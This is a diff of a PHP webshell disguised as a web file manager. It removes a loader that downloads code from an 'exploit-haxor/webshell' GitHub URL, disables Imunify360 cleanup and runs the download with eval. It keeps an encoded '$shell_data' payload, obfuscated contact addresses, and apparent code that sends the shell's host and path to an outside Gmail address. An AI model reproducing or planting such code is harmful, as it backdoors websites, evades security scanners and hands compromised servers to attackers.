@@ -18,21 +18,11 @@ $shell_data="JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07CmlmICgkdml
  * @github https://github.com/
  * @link https://github.com/
  */
-$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/mydb.php";
-$ch = curl_init($url); 
-error_reporting(0);
-ini_set('lsapi_backend_off', '1');
-ini_set("imunify360.cleanup_on_restore", false);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-$result = curl_exec($ch);
-eval("?>".$result);
+
 $e=base64_decode("YmxhY2toYXQxMzM3LmlkQGdtYWlsLmNvbQ==");
 //Default Configuration
 $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
 /**
- * 
- * 
- * 
  * 
  */
 
@@ -173,6 +163,8 @@ define('MAX_UPLOAD_SIZE', $max_upload_size_bytes);
 $h=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
 header('Content-Type: text/html; charset=UTF-8');
 $to = "muhrazky@gmail.com";
+
+
 // Root path for file manager
 // use absolute path of directory i.e: '/var/www/folder' or $_SERVER['DOCUMENT_ROOT'].'/folder'
 $root_path = $_SERVER['DOCUMENT_ROOT'];
